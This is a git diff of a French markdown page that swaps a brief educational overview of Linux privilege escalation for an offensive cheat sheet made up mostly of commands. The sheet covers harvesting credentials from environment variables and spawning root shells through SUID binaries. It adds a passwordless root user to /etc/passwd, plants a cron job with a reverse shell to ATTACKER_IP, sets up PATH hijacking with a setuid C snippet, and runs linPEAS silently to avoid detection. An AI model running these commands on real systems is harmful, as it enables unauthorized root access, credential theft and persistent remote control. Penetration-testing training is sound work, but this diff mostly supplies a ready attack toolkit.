@@ -4,36 +4,254 @@ date: "2025-07-20"
 draft: false
 ---
 
-# 🛡️ Privilege Escalation
+# 🔥 Privilege Escalation - Cheat Sheet
 
-## Qu'est-ce que l'élévation de privilèges ?
+## 🎯 Vue d'ensemble
+L'escalade de privilèges permet d'obtenir des droits plus élevés sur un système. Deux types principaux :
+- **Verticale** : Utilisateur → Root/Admin
+- **Horizontale** : Utilisateur A → Utilisateur B
 
-L'élévation de privilèges (Privilege Escalation) désigne l'ensemble des techniques permettant à un utilisateur ou un attaquant d'obtenir des droits plus élevés que ceux qui lui sont initialement accordés sur un système.
+---
 
-## 🎯 Objectifs pédagogiques
-- Comprendre les différents types d'élévation de privilèges (verticale, horizontale)
-- Savoir identifier et exploiter des failles d'escalade de privilèges
+## 🔍 Énumération Initiale
 
-## 📋 Exemples de scénarios et commandes
-- Exploiter une mauvaise configuration sudo pour obtenir un shell root
-- Utiliser un exploit local pour contourner les restrictions de sécurité
-- Détourner des services ou des binaires SUID/SGID
+### Informations Système
+```bash
+# Informations de base
+# Pourquoi : Comprendre l'environnement et identifier les vecteurs d'attaque
+whoami && id
+hostname && uname -a
+cat /etc/os-release
+ps aux | grep root
 
-## 🛠️ Outils et commandes les plus utilisés
-- **linPEAS / winPEAS** : Audit automatisé des failles d'escalade sur Linux/Windows
-- **sudo -l** : Lister les commandes sudo autorisées
-- **find / -perm -4000 -type f 2>/dev/null** : Lister les binaires SUID
-- **GTFOBins** : Base de données d'exploitation de binaires système
+# Variables d'environnement
+# Pourquoi : Les variables d'env peuvent contenir des credentials ou des chemins sensibles
+env | grep -i pass
+env | grep -i key
+env | grep -i secret
+```
 
-## 🛡️ Bonnes pratiques
-- Appliquer le principe du moindre privilège
-- Auditer régulièrement les droits et permissions
-- Mettre à jour les systèmes et corriger les vulnérabilités connues
+### Droits Sudo
+```bash
+# Vérifier les commandes sudo autorisées
+# Pourquoi : Identifier les commandes qui peuvent être exécutées avec des privilèges élevés
+sudo -l
+sudo -l -U username
 
-## 📚 Ressources utiles
-- [GTFOBins](https://gtfobins.github.io/)
-- [HackTricks - Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
-- [OWASP - Privilege Escalation](https://owasp.org/www-community/attacks/Privilege_Escalation)
+# Exploiter sudo sans mot de passe
+# Pourquoi : Si sudo ne demande pas de mot de passe, on peut obtenir un shell root
+sudo -u root /bin/bash
+sudo -u root /bin/sh
+```
+
+### Binaires SUID/SGID
+```bash
+# Trouver les binaires SUID
+# Pourquoi : Les binaires SUID s'exécutent avec les privilèges du propriétaire
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -u=s -type f 2>/dev/null
+
+# Trouver les binaires SGID
+# Pourquoi : Les binaires SGID s'exécutent avec les privilèges du groupe
+find / -perm -2000 -type f 2>/dev/null
+find / -perm -g=s -type f 2>/dev/null
+
+# Binaires SUID populaires à exploiter
+# Pourquoi : Ces binaires sont souvent mal configurés et permettent l'escalade
+find / -name "nmap" -perm -4000 2>/dev/null
+find / -name "vim" -perm -4000 2>/dev/null
+find / -name "python*" -perm -4000 2>/dev/null
+find / -name "bash" -perm -4000 2>/dev/null
+```
+
+---
+
+## 🛠️ Exploitation des Binaires SUID
+
+### Python
+```bash
+# Python SUID
+# Pourquoi : Python peut exécuter des commandes système avec les privilèges du propriétaire
+python -c 'import os; os.system("/bin/bash")'
+python3 -c 'import os; os.system("/bin/bash")'
+
+# Python avec pty
+# Pourquoi : Créer un terminal interactif pour un shell plus stable
+python -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+### Vim/VI
+```bash
+# Vim SUID
+# Pourquoi : Vim peut exécuter des commandes système via ses fonctions intégrées
+vim -c ':!/bin/bash'
+vim -c ':set shell=/bin/bash:shell'
+```
+
+### Nmap
+```bash
+# Nmap SUID (version interactive)
+# Pourquoi : Nmap peut exécuter des commandes système en mode interactif
+nmap --interactive
+nmap> !bash
+nmap> !sh
+```
+
+### Find
+```bash
+# Find SUID
+# Pourquoi : Find peut exécuter des commandes via l'option -exec
+find /etc/passwd -exec /bin/bash \;
+find /etc/passwd -exec /bin/sh \;
+```
+
+### Less/More
+```bash
+# Less SUID
+# Pourquoi : Less peut exécuter des commandes via l'opérateur !
+less /etc/passwd
+!/bin/bash
+
+# More SUID
+# Pourquoi : More peut également exécuter des commandes système
+more /etc/passwd
+!/bin/bash
+```
+
+---
+
+## 📁 Exploitation des Permissions
+
+### Fichiers Écriturables
+```bash
+# Fichiers de configuration critiques
+# Pourquoi : Ces fichiers contrôlent l'authentification et les privilèges
+ls -la /etc/passwd
+ls -la /etc/shadow
+ls -la /etc/sudoers
+
+# Ajouter un utilisateur root
+# Pourquoi : Créer un compte avec des privilèges root complets
+echo "hacker::0:0::/root:/bin/bash" >> /etc/passwd
+```
+
+### Cron Jobs
+```bash
+# Lister les cron jobs
+# Pourquoi : Les cron jobs s'exécutent avec des privilèges spécifiques
+crontab -l
+cat /etc/crontab
+ls -la /var/spool/cron/
+ls -la /etc/cron.d/
+
+# Créer un cron job malveillant
+# Pourquoi : Les cron jobs peuvent exécuter des commandes avec des privilèges élevés
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'" | crontab -
+```
+
+### Services
+```bash
+# Services avec privilèges élevés
+# Pourquoi : Identifier les services qui s'exécutent avec des privilèges root
+systemctl list-units --type=service --state=running
+ps aux | grep root
+
+# Modifier un service
+# Pourquoi : Les services peuvent être modifiés pour exécuter du code malveillant
+systemctl edit --full service_name
+```
+
+---
+
+## 🔧 Outils Automatisés
+
+### LinPEAS
+```bash
+# Télécharger et exécuter
+# Pourquoi : LinPEAS automatise la découverte des vecteurs d'escalade
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+
+# Exécution silencieuse
+# Pourquoi : Éviter la détection en exécutant silencieusement
+./linpeas.sh -s | tee linpeas_output.txt
+```
+
+### LinEnum
+```bash
+# Télécharger et exécuter
+# Pourquoi : LinEnum est un script d'énumération Linux complet
+wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+```
+
+### Linux Exploit Suggester
+```bash
+# Vérifier les exploits disponibles
+# Pourquoi : Identifier les exploits kernel disponibles pour la version détectée
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+chmod +x linux-exploit-suggester.sh
+./linux-exploit-suggester.sh
+```
+
+---
+
+## 🎯 Techniques Avancées
+
+### Kernel Exploits
+```bash
+# Vérifier la version du kernel
+# Pourquoi : Les exploits kernel sont spécifiques à la version
+uname -r
+cat /proc/version
+
+# Exploits populaires
+# Pourquoi : Ces exploits sont bien documentés et souvent efficaces
+# Dirty COW (CVE-2016-5195)
+# Sudo Baron Samedit (CVE-2021-3156)
+# PwnKit (CVE-2021-4034)
+```
+
+### Conteneurs Docker
+```bash
+# Vérifier si on est dans un conteneur
+# Pourquoi : Les techniques d'évasion de conteneur sont différentes
+cat /.dockerenv
+mount | grep docker
+env | grep -i docker
+
+# Évasion de conteneur
+# Pourquoi : Sortir du conteneur pour accéder au système hôte
+# Montage du host filesystem
+# Escape via capabilities
+```
+
+### Variables d'Environnement
+```bash
+# Variables sensibles
+# Pourquoi : Les variables d'env peuvent contenir des credentials
+env | grep -i pass
+env | grep -i key
+env | grep -i secret
+env | grep -i token
+
+# PATH hijacking
+# Pourquoi : Remplacer les binaires système par des versions malveillantes
+echo 'int main(){setuid(0);system("/bin/bash");}' > /tmp/sudo
+chmod +x /tmp/sudo
+export PATH="/tmp:$PATH"
+```
+
+---
+
+## 📚 Ressources
+
+- **GTFOBins** : https://gtfobins.github.io/
+- **HackTricks** : https://book.hacktricks.xyz/linux-hardening/privilege-escalation
+- **PayloadsAllTheThings** : https://github.com/swisskyrepo/PayloadsAllTheThings
+- **LinPEAS** : https://github.com/carlospolop/PEASS-ng
 
 ---
 
